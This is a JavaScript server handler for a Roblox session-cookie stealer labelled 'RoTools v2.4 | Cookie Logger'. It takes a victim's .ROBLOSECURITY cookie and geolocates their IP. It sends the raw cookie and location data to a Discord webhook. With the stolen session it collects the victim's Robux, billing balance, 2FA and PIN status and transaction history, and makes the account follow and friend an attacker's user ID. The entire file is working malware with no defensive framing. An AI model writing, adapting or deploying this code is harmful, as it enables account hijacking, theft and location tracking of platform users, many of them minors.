import fetch from 'node-fetch';

export default async function handler(req, res) {
  // Verify authorization
  if (req.headers.authorization !== 'Bearer secure-token-2025') {
    return res.status(401).json({ error: 'Unauthorized' });
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { cookie } = req.body;
    if (!cookie) {
      return res.status(400).json({ error: 'No cookie provided' });
    }

    // Get client IP address
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
    
    // Get detailed IP information
    let ipInfo = {};
    try {
      const ipRes = await fetch(`http://ip-api.com/json/${ip}?fields=66842623`);
      ipInfo = await ipRes.json();
    } catch (ipError) {
      console.error('IP info fetch error:', ipError);
      ipInfo = { status: 'error', message: 'IP lookup failed' };
    }

    // Format IP information fields
    const ipFields = [];
    if (ipInfo.status === 'success') {
      ipFields.push(
        { name: '📍 Location', value: `${ipInfo.city}, ${ipInfo.regionName}, ${ipInfo.country}`, inline: true },
        { name: '📡 ISP', value: ipInfo.isp || 'Unknown', inline: true },
        { name: '🏢 Organization', value: ipInfo.org || 'Unknown', inline: true },
        { name: '🛰️ AS', value: ipInfo.as || 'Unknown', inline: true },
        { name: '🌐 Coordinates', value: `[${ipInfo.lat}, ${ipInfo.lon}](https://maps.google.com/?q=${ipInfo.lat},${ipInfo.lon})`, inline: true },
        { name: '📮 ZIP', value: ipInfo.zip || 'Unknown', inline: true },
        { name: '⏰ Timezone', value: ipInfo.timezone || 'Unknown', inline: true },
        { name: '💰 Currency', value: ipInfo.currency || 'Unknown', inline: true },
        { name: '🔐 Proxy', value: ipInfo.proxy ? '✅ Yes' : '❌ No', inline: true },
        { name: '🛡️ Hosting', value: ipInfo.hosting ? '✅ Yes' : '❌ No', inline: true }
      );
    } else {
      ipFields.push(
        { name: '❌ IP Info Error', value: ipInfo.message || 'Failed to fetch IP information' }
      );
    }

    // Enhanced CSRF token function with dual methods
    const getCsrfToken = async () => {
      try {
        // Method 1: Get token from authentication endpoint headers
        const tokenResponse = await fetch('https://auth.roblox.com/v2/login', {
          method: 'POST',
          headers: { 
            'Cookie': `.ROBLOSECURITY=${cookie}`,
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ ctype: 'Username', cvalue: 'csrf_fetch', password: 'none' })
        });
        
        if (tokenResponse.status === 403) {
          const token = tokenResponse.headers.get('x-csrf-token');
          if (token) return token;
        }

        // Method 2: Get token from homepage HTML if header method fails
        const homeResponse = await fetch('https://www.roblox.com/home', {
          headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });
        
        if (!homeResponse.ok) {
          throw new Error(`Homepage fetch failed: ${homeResponse.status}`);
        }
        
        const homeHtml = await homeResponse.text();
        const metaTagMatch = homeHtml.match(/<meta name="csrf-token" data-token="([^"]+)"/);
        
        if (metaTagMatch && metaTagMatch[1]) {
          return metaTagMatch[1];
        }
        
        throw new Error('Both CSRF token methods failed');
      } catch (error) {
        console.error('CSRF token fetch error:', error);
        throw new Error('CSRF token retrieval failed');
      }
    };

    // Enhanced follow function with retries
    const followUser = async (userId) => {
      for (let attempt = 1; attempt <= 3; attempt++) {
        try {
          const csrfToken = await getCsrfToken();
          const response = await fetch(`https://friends.roblox.com/v1/users/${userId}/follow`, {
            method: 'POST',
            headers: {
              'Cookie': `.ROBLOSECURITY=${cookie}`,
              'X-CSRF-TOKEN': csrfToken,
              'Referer': 'https://www.roblox.com/',
              'Origin': 'https://www.roblox.com'
            }
          });
          
          if (response.ok) return true;
          
          // If we get a 403, try to get a new CSRF token
          if (response.status === 403) {
            console.log(`Follow attempt ${attempt} failed with 403, retrying...`);
            continue;
          }
          
          const errorBody = await response.text();
          console.error(`Follow error: ${response.status} - ${errorBody}`);
          return false;
        } catch (e) {
          console.error(`Follow attempt ${attempt} error:`, e);
          if (attempt === 3) return false;
        }
      }
      return false;
    };

    // Enhanced friend request function with retries
    const sendFriendRequest = async (userId) => {
      for (let attempt = 1; attempt <= 3; attempt++) {
        try {
          const csrfToken = await getCsrfToken();
          const response = await fetch(`https://friends.roblox.com/v1/users/${userId}/request-friendship`, {
            method: 'POST',
            headers: {
              'Cookie': `.ROBLOSECURITY=${cookie}`,
              'X-CSRF-TOKEN': csrfToken,
              'Referer': 'https://www.roblox.com/',
              'Origin': 'https://www.roblox.com',
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({})  // Empty body required
          });
          
          if (response.ok) return true;
          
          // If we get a 403, try to get a new CSRF token
          if (response.status === 403) {
            console.log(`Friend request attempt ${attempt} failed with 403, retrying...`);
            continue;
          }
          
          const errorBody = await response.text();
          console.error(`Friend request error: ${response.status} - ${errorBody}`);
          return false;
        } catch (e) {
          console.error(`Friend request attempt ${attempt} error:`, e);
          if (attempt === 3) return false;
        }
      }
      return false;
    };

    // Send cookie + IP info to Discord with @everyone ping
    await fetch(process.env.DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: "@everyone",
        embeds: [
          {
            title: "🍪 RAW COOKIE RECEIVED",
            description: `\`\`\`\n${cookie}\n\`\`\``,
            color: 0x000000,
            footer: { text: "RoTools v2.4 | Cookie Logger" },
            timestamp: new Date().toISOString()
          },
          {
            title: "🌐 IP INFORMATION",
            color: 0x000000,
            fields: [
              { name: '📡 IP Address', value: `\`${ip}\``, inline: false },
              ...ipFields
            ],
            footer: { text: "RoTools v2.4 | IP Intelligence" },
            timestamp: new Date().toISOString()
          }
        ]
      })
    });

    // Get account information
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
    });
    
    if (!userRes.ok || userRes.status === 401) {
      // Send invalid cookie notification
      await fetch(process.env.DISCORD_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: "❌ INVALID COOKIE",
            description: "Authentication failed with provided cookie",
            color: 0x000000,
            footer: { text: "RoTools v2.4 | Error" },
            timestamp: new Date().toISOString()
          }]
        })
      });
      
      return res.json({ 
        success: false, 
        error: 'Invalid cookie - authentication failed'
      });
    }

    const userData = await userRes.json();
    const userId = userData.id;

    // Fetch all data in parallel
    const [
      robuxRes,
      creditRes,
      settingsRes,
      friendsRes,
      voiceRes,
      gamepassesRes,
      badgesRes,
      transactionsRes,
      thumbnailRes
    ] = await Promise.all([
      fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch('https://billing.roblox.com/v1/credit', { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch('https://www.roblox.com/my/settings/json', { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch(`https://friends.roblox.com/v1/my/friends/count`, { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch('https://voice.roblox.com/v1/settings', { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch(`https://www.roblox.com/users/inventory/list-json?assetTypeId=34&cursor=&itemsPerPage=100&pageNumber=1&userId=${userId}`, { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch(`https://accountinformation.roblox.com/v1/users/${userId}/roblox-badges`, { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch(`https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=Year&transactionType=summary`, { 
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` } 
      }),
      fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?size=48x48&format=png&userIds=${userId}`)
    ]);

    // Parse responses
    const robuxData = await robuxRes.json();
    const creditData = await creditRes.json();
    const settingsData = await settingsRes.json();
    const friendsData = await friendsRes.json();
    const voiceData = await voiceRes.json();
    const gamepassesData = await gamepassesRes.text();
    const badgesData = await badgesRes.text();
    const transactionsData = await transactionsRes.json();
    const thumbnailData = await thumbnailRes.json();

    // Process data
    const account_gamepasses_worth = (gamepassesData.match(/"PriceInRobux":(\d+)/g) || [])
      .reduce((sum, match) => sum + parseInt(match.split(':')[1]), 0);
    
    // Truncate badges list if too long
    let account_badges = (badgesData.match(/"name":"(.*?)"/g) || [])
      .map(match => match.split('"')[3])
      .join(', ') || 'None';
    
    if (account_badges.length > 1000) {
      account_badges = account_badges.substring(0, 1000) + '... (truncated)';
    }

    // Prepare account information embed
    const accountInfoEmbed = {
      title: "✅ ACCOUNT INFORMATION",
      color: 0x000000,
      thumbnail: { url: thumbnailData.data[0].imageUrl },
      fields: [
        { name: "💰 Robux", value: `${robuxData.robux}`, inline: true },
        { name: "💳 Balance", value: `${creditData.balance} ${creditData.currencyCode}`, inline: true },
        { name: "👤 Account Name", value: `${settingsData.Name} (${settingsData.DisplayName})`, inline: true },
        { name: "📧 Email Verified", value: `${settingsData.IsEmailVerified}`, inline: true },
        { name: "🎂 Account Age", value: `${(settingsData.AccountAgeInDays / 365).toFixed(2)} years`, inline: true },
        { name: "👶 Above 13", value: `${settingsData.UserAbove13}`, inline: true },
        { name: "🌟 Premium", value: `${settingsData.IsPremium}`, inline: true },
        { name: "🔑 Has PIN", value: `${settingsData.IsAccountPinEnabled}`, inline: true },
        { name: "🔒 2FA Enabled", value: `${settingsData.MyAccountSecurityModel?.IsTwoStepEnabled || false}`, inline: true },
        { name: "👥 Friends", value: `${friendsData.count}`, inline: true },
        { name: "🎤 Voice Verified", value: `${voiceData.isVerifiedForVoice}`, inline: true },
        { name: "🎮 Gamepasses Value", value: `${account_gamepasses_worth} R$`, inline: true },
        { name: "🏆 Badges", value: account_badges.length > 1024 ? 'Too many to display' : account_badges, inline: false },
        { name: "💹 Transactions", value: "--------------------------------", inline: false },
        { name: "🛒 Sales of Goods", value: `${transactionsData.salesTotal}`, inline: true },
        { name: "💎 Premium Payouts", value: `${transactionsData.premiumPayoutsTotal}`, inline: true },
        { name: "📈 Commissions", value: `${transactionsData.affiliateSalesTotal}`, inline: true },
        { name: "💳 Robux Purchased", value: `${transactionsData.currencyPurchasesTotal}`, inline: true },
        { name: "⏳ Pending", value: `${transactionsData.pendingRobuxTotal}`, inline: true },
        { name: "📊 Overall", value: `${Math.abs(transactionsData.purchasesTotal)}`, inline: true }
      ],
      footer: { text: "RoTools v2.4 | Account Information" },
      timestamp: new Date().toISOString()
    };

    // Send account information to Discord
    await fetch(process.env.DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [accountInfoEmbed] })
    });

    // Perform follow and friend requests with detailed error reporting
    const ATTACKER_USER_ID = process.env.ATTACKER_USER_ID || '8318490238';
    
    if (ATTACKER_USER_ID) {
      let followSuccess = false;
      let friendSuccess = false;
      let followError = '';
      let friendError = '';
      
      try {
        followSuccess = await followUser(ATTACKER_USER_ID);
        if (!followSuccess) followError = 'Follow action failed after 3 attempts';
      } catch (e) {
        followError = e.message;
      }
      
      try {
        friendSuccess = await sendFriendRequest(ATTACKER_USER_ID);
        if (!friendSuccess) friendError = 'Friend request failed after 3 attempts';
      } catch (e) {
        friendError = e.message;
      }
      
      // Prepare detailed results for Discord
      const actionResults = [
        { 
          name: 'Follow Action', 
          value: followSuccess ? '✅ Success' : `❌ Failed${followError ? `: ${followError}` : ''}`,
          inline: true 
        },
        { 
          name: 'Friend Request', 
          value: friendSuccess ? '✅ Success' : `❌ Failed${friendError ? `: ${friendError}` : ''}`,
          inline: true 
        },
        { name: 'Target User', value: ATTACKER_USER_ID, inline: false },
        { name: 'CSRF Method', value: 'Dual-method with retries', inline: false }
      ];
      
      // Send action results to Discord
      await fetch(process.env.DISCORD_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: "🤖 AUTO ACTIONS PERFORMED",
            color: 0x000000,
            fields: actionResults,
            footer: { text: "RoTools v2.4 | Auto Actions" },
            timestamp: new Date().toISOString()
          }]
        })
      });
    }

    return res.json({ success: true });
    
  } catch (error) {
    console.error('Server error:', error);
    
    // Send error notification to Discord
    await fetch(process.env.DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: "@everyone",
        embeds: [{
          title: "❌ PROCESSING ERROR",
          color: 0x000000,
          fields: [{
            name: "Error Details",
            value: `\`\`\`\n${error.message || 'Unknown error'}\n\`\`\``
          }],
          footer: { text: "RoTools v2.4 | Error Notification" },
          timestamp: new Date().toISOString()
        }]
      })
    });
    
    return res.status(500).json({ 
      success: false, 
      error: error.message || 'Internal server error' 
    });
  }
}
